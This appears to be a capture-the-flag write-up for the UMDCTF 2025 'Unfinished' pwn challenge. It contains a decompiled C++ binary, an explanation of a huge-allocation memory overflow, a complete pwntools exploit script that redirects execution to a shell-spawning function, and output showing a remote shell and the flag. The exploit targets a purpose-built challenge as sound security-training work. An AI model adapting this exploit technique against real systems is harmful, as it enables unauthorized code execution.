---
title: "Unfinished 🚧 – Heap Mismanagement and RAX Control (UMDCTF 2025)"
tags: [CTF, binary exploitation, Heap Overflow, RAX control, pwn]
---

# UMDCTF 2025 - Unfinished Pwn Challenge Writeup 🚧
**Author:** [@notagain_pwn](https://github.com/notagain-pwn) (RaptX team)

![CTF](https://img.shields.io/badge/CTF-UMDCTF_2025-blue)
![Challenge](https://img.shields.io/badge/Challenge-Unfinished-informational)
![Category](https://img.shields.io/badge/Category-Pwn-red)
![Difficulty](https://img.shields.io/badge/difficulty-Medium-orange)

## Table of Contents 📚
- [Challenge Overview 📄](#challenge-overview-)
- [Introduction 🎯](#introduction-)
- [Binary Analysis 🔍](#binary-analysis-)
- [Exploitation Strategy 🛠️](#exploitation-strategy-)
- [Detailed Under-the-Hood Explanation 🧠](#detailed-under-the-hood-explanation-)
- [Exploit Script 🧨](#exploit-script-)
- [Result 🏆](#result-)
- [Takeaways ✨](#takeaways-)

## Challenge Overview 📄

- **Binary:** run (ELF 64-bit)

**Protections:**
```
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: No PIE (0x400000)
Stripped: No
```

## Introduction 🎯

The challenge revolves around a mismanaged heap allocation in a C++ program using `new[]`.  
By requesting a very large allocation size and overflowing, we can control a key pointer and eventually trigger `system("/bin/sh")` through a hidden function `sigma_mode()`.

## Binary Analysis 🔍

Relevant snippet from `main()`:

```c
undefined8 main(void)
{
  ulong uVar1;
  long lVar2;

  setvbuf(stdout,0,2,0);
  setvbuf(stdin,0,2,0);
  puts("What size allocation?");
  fgets(number,500,stdin);
  uVar1 = atol(number);
  if (uVar1 < 0x1fffffffffffffff) {
    lVar2 = uVar1 << 2;
  } else {
    lVar2 = __cxa_throw_bad_array_new_length();
  }
  _Znam(lVar2);
  return 0;
}
```

And the win function:

```c
void _Z10sigma_modev(void)
{
  system("/bin/sh");
}
```
- Uses `fgets` to read an allocation size.
- Calls `atol()` to convert the string to integer.
- Allocates memory with `new[]`.
- If allocation fails, fallback to `bad_alloc` is thrown.

## Exploitation Strategy 🛠️

1. Input a large number (`230584300921369395`) less than `0x1fffffffffffffff` to bypass checks.
2. Overflow up to the saved return address.
3. Overwrite the return address to call `sigma_mode()`.
4. `sigma_mode` triggers `system("/bin/sh")`.

With pwndbg & cyclic, after allocating this big number, we saw that the important overwrite had to target `RAX`, not directly the stack return pointer.  

By controlling what `RAX` points to, the program then calls `system("/bin/sh")`.

With `cyclic` from pwntools and gdb, we found that the overflow offset was 181 bytes.

## Detailed Under-the-Hood Explanation 🧠

In this C++ binary, the flow isn't the classical stack-based buffer overflow:
- **Allocation with `new[]`** returns a **heap** chunk, not directly on the stack.
- The code expects `new[]` to either succeed or throw an exception (`bad_alloc`).
- However, if the allocation size is huge (but still under the `if (uVar1 < 0x1fffffffffffffff)` check), the program behaves weirdly.
- Instead of cleanly throwing an error, it **proceeds** with partially initialized memory structures.
- As a result, the program will later dereference uninitialized memory and **attempt to call a function pointer stored inside RAX**.

Because we control part of this memory layout (through input size and buffer), we manage to **smuggle** a crafted RAX value pointing to our payload.

Thus, it wasn't a direct stack-based RIP overwrite: it was a **heap-based RAX control** which then gets **called**.

When `sigma_mode()` is called, we achieve code execution.

## Exploit Script 🧨

```python
from pwn import *
import argparse
import os

# Binary and library paths
BINARY = './run'
LIBC_PATH = './libc.so.6'
LD_PATH = './ld-linux-x86-64.so.2'

# Offsets and important addresses
SIGMA_MODE = 0x4019b6  # system("/bin/sh") inside sigma_mode
OFFSET = 181

# Setup context
context.binary = BINARY

def start_local():
    return process([LD_PATH, '--library-path', os.path.dirname(LIBC_PATH), BINARY])

def start_remote(host, port):
    return remote(host, port)

def build_payload():
    payload = b'230584300921369395 '
    payload += b'A' * OFFSET
    payload += p64(SIGMA_MODE)
    return payload

def exploit(p):
    p.recvline()
    p.sendline(build_payload())
    sleep(0.2)
    p.sendline(b'id')
    p.interactive()

def main():
    parser = argparse.ArgumentParser(description="Exploit script for unfinished challenge.")
    parser.add_argument('--host', help='Remote host to connect')
    parser.add_argument('--port', type=int, help='Remote port to connect')
    args = parser.parse_args()

    if args.host and args.port:
        p = start_remote(args.host, args.port)
    else:
        p = start_local()

    exploit(p)

if __name__ == '__main__':
    main()
```

## Result 🏆

```bash
└──╼ $ python3 exp.py --host challs.umdctf.io --port 31003
[+] Opening connection to challs.umdctf.io on port 31003: Done
[*] Switching to interactive mode
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
$ cat flag*
UMDCTF{crap_i_have_to_come_up_with_a_flag_too?????????}
```

## Takeaways ✨

- Heap mismanagement can be just as powerful as stack-based exploits.
- Always be careful with unchecked huge memory allocations.
- RAX control can substitute RIP control in certain scenarios.
- Think beyond classical stack smashing!

🔙 [Back to UMDCTF 2025 Writeups](../../)
